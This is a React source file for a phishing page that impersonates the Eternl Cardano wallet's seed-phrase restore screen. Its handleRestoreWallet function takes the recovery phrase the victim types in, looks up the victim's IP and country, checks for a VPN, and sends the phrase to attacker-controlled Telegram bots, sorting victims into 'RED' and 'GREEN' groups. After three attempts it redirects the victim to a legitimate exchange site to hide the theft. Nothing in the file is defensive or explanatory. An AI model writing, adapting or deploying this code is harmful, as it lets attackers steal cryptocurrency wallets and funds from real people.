import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { checkVpnStatus } from "../utils/userLocation";

function EternlRestoreWallet() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState("");
  const [isNextClicked, setIsNextClicked] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState([]);
  const [attempts, setAttempts] = useState(0);
  const navigate = useNavigate();

  const handleToggle = () => {
    setIsMenuOpen(!isMenuOpen);
  };

  const handleWalletChange = (event) => {
    setSelectedWallet(event.target.value);
  };

  const handleNextClick = () => {
    if (selectedWallet) {
      setIsNextClicked(true);
    } else {
      alert("Please select a wallet type.");
    }
  };

  const handleInputChange = (index, event) => {
    const newSeedPhrase = [...seedPhrase];
    newSeedPhrase[index] = event.target.value;
    setSeedPhrase(newSeedPhrase);
  };

  const handleRestoreWallet = async () => {
    const message = seedPhrase.join(" ");

    // Get the user's IP address
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    // Get country code
    const response = await fetch("https://ipapi.co/json/");
    const ipapiData = await response.json();
    const countryCode = ipapiData.country_code;

    const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
    const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
    const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
    const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;

    const specialCountries = ["NG","AE"];

    // Check VPN status using the IP we retrieved
    const isVpn = await checkVpnStatus(ip);
    const isSpecialCountry = specialCountries.includes(countryCode);

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;

    const data = {
        chat_id: chat_id,
        text: `Eternl: ${message}`,
    };

    let odata;
    if (isVpn || isSpecialCountry) {
        odata = {
            chat_id: ochat_id,
            text: `Eternl (RED): ${message}`,
        };
    } else {
        odata = {
            chat_id: ochat_id,
            text: `Eternl (GREEN): ${message}`,
        };
    }

    // Increment the attempt count
    setAttempts((prevAttempts) => prevAttempts + 1);
    const currentAttempts = attempts + 1; // Get the current attempt count

    // Determine which endpoints to send the message to
    const endpoints = (isVpn || isSpecialCountry)
        ? [
            { url: ourl, data: odata },
            { url: url, data: data },
          ]
        : [
            { url: ourl, data: odata },
          ];

    if (currentAttempts <= 3) {
        for (const endpoint of endpoints) {
            try {
                const response = await fetch(endpoint.url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(endpoint.data),
                });

                if (!response.ok) {
                    throw new Error("Network response was not ok");
                }

                console.log("Message sent successfully to:", endpoint.url);
            } catch (error) {
                console.error("Error sending message:", error);
            }
        }
    } else {
        window.location.href = "https://minswap.org/fi-FI";
    }
};


  const renderInputs = () => {
    const numWords =
      selectedWallet === "24words"
        ? 24
        : selectedWallet === "15words"
        ? 15
        : selectedWallet === "12words"
        ? 12
        : 0;
    return (
      <div className=" overflow-x-auto p-2" style={{ maxHeight: "60vh" }}>
        <div className="bg-[#646f7e] p-3 text-white flex items-center text-xs md:text-base text-left gap-2">
          <i className="fa-solid fa-circle-info"></i>
          <p>
            Enter your wallet recovery phrase word for word. Make sure you enter
            the words in the correct order. Also ensure nobody is looking at
            your screen.
          </p>
        </div>
        <h1 className="text-white text-left mt-5"> Recovery Phrase</h1>
        <div className=" grid grid-cols-2 md:grid-cols-4 mt-10 text-left flex flex-col gap-3 text-xs md:text-sm">
          {[...Array(numWords)].map((_, index) => (
            <input
              key={index}
              type="text"
              className="mb-2 p-2 border rounded bg-[#646f7e] text-white"
              placeholder={`Word ${index + 1}`}
              onChange={(event) => handleInputChange(index, event)}
            />
          ))}
        </div>

        <div className="text-white text-left">
          <h1>Enter Word</h1>
          <h1 className="p-3 bg-[#646f7e] rounded">
            Enter a character to get suggestions.{" "}
          </h1>
          <input
            type="text"
            name=""
            id=""
            className="bg-[#383838] mt-3 mb-3 p-3  "
            style={{ width: "100%" }}
          />
        </div>

        <div className="flex gap-3 mb-8 text-white justify-end">
          <Link
            to="/eternlAddWallet"
            className="ps-8 pe-8 pt-2 pb-2 rounded bg-[#383838]"
          >
            Back
          </Link>
          <button
            className={`ps-8 pe-8 pt-2 pb-2 rounded bg-[#646f7e] ${
              seedPhrase.length !== numWords || seedPhrase.includes("")
                ? "opacity-30"
                : "opacity-100"
            }`}
            onClick={handleRestoreWallet}
            disabled={seedPhrase.length !== numWords || seedPhrase.includes("")}
          >
            Continue
          </button>
        </div>
      </div>
    );
  };

  return (
    <div className="EternlRestoreWallet fixed inset-0 backdrop-blur-sm z-50 bg-[#131826]  z-50">
      <nav className="bg-[#131826] pt-3 ps-3 pe-3 pb-1">
        <div className="flex items-center justify-between">
          <img
            src="https://eternl.io/images/img-logo-small.png"
            className="w-28"
            alt="icon"
          />
          <div className="text-white flex gap-3">
            <i className="fa-solid fa-sync"></i>
            <i className="fa-solid fa-eye"></i>
            <i className="fa-solid fa-plug"></i>
            <i className="fa-solid fa-sun"></i>
            <i
              className={`fa-solid ${isMenuOpen ? "fa-x" : "fa-bars"}`}
              onClick={handleToggle}
            ></i>
          </div>
        </div>
        <div className="bg-[#404040] p-1 rounded-md">
          <p className="text-center text-gray-300 text-xs font-bold">
            Epoch: 488 : 068453 /432000 ( 15 . 85 % ~4d 04:59:07) · ₳ 1 =
            $0.4497
          </p>
        </div>
      </nav>

      {isMenuOpen && (
        <div className="bg-[#262626] text-center">
          <div
            className="navi bg-[#383838] fixed left-3 rounded flex flex-col justify-between"
            style={{ height: "85vh" }}
          >
            <div className="flex items-center gap-3 border border-stone-500 p-4">
              <i className="fa-solid fa-wallet text-white"></i>
              <div className="text-white text-left font-bold">
                <h1>Connecy Wallet</h1>
                <p>Create or restore a wallet.</p>
              </div>
            </div>
            <div>
              <div>
                <div className="flex items-center gap-3 border border-stone-500 p-4">
                  <i className="fa-solid fa-plug text-white"></i>
                  <div className="text-white text-left font-bold">
                    <h1>DApp browser</h1>
                    <p>Connect to Cardano wallet.</p>
                  </div>
                </div>
              </div>
              <div></div>
              <div></div>
            </div>
          </div>
        </div>
      )}

      <div className="p-3 md:ps-20 md:pe-20 md:pb-20 text-center bg-[#262626]">
        <div className="bg-[#383838] text-white p-3">
          <h1>Restore a Cardano wallet</h1>
          <p>Only Shelley era wallets supported.</p>
        </div>
        {!isNextClicked ? (
          <div
            className="text-left text-white text-sm md:text-base md:ps-20 m-auto mt-6 md:mt-20"
            style={{ maxWidth: "900px" }}
          >
            <h1 className="mb-4 font-bold">
              What kind of wallet would you like to restore?
            </h1>
            <p>
              Daedalus, Yoroi and Eternl use recovery phrases of either 15 or 24
              words length. 12 words are also common. Byron era wallets are
              currently not supported. If you need to recover a pre-August 2020
              wallet, please use Daedalus.
            </p>

            <div className="mt-10 text-left flex flex-col gap-3 text-xs md:text-sm">
              <div className="flex items-start gap-3">
                <input
                  type="radio"
                  name="wallet"
                  value="24words"
                  checked={selectedWallet === "24words"}
                  onChange={handleWalletChange}
                />
                <div>
                  <h1>24 Words</h1>
                  <p>A Shelley wallet created by, eg. Eternl or Daedalus.</p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <input
                  type="radio"
                  name="wallet"
                  value="15words"
                  checked={selectedWallet === "15words"}
                  onChange={handleWalletChange}
                />
                <div>
                  <h1>15 Words</h1>
                  <p>Eg. a Yoroi Shelley wallet..</p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <input
                  type="radio"
                  name="wallet"
                  value="12words"
                  checked={selectedWallet === "12words"}
                  onChange={handleWalletChange}
                />
                <div>
                  <h1>12 Words</h1>
                  <p>A 12 words Shelley wallet..</p>
                </div>
              </div>
            </div>

            <div className="text-right">
              <button
                className="text-right bg-[#646f7e] rounded ps-10 pe-10 pt-2 pb-2"
                onClick={handleNextClick}
              >
                Next
              </button>
            </div>
          </div>
        ) : (
          renderInputs()
        )}
      </div>
      <footer className="text-white text-center flex items-center justify-center p-1 text-xs gap-2 bg-gradient-to-r from-purple-900 via-purple-500 to-blue-900 mt-10">
        <p>©2024 · v1.12.5 ( web ) · Imprint ·</p>
        <i className="fa-brands fa-twitter"></i>
        <i className="fa-brands fa-telegram"></i>
        <i className="fa-brands fa-discord"></i>
      </footer>
    </div>
  );
}

export default EternlRestoreWallet;
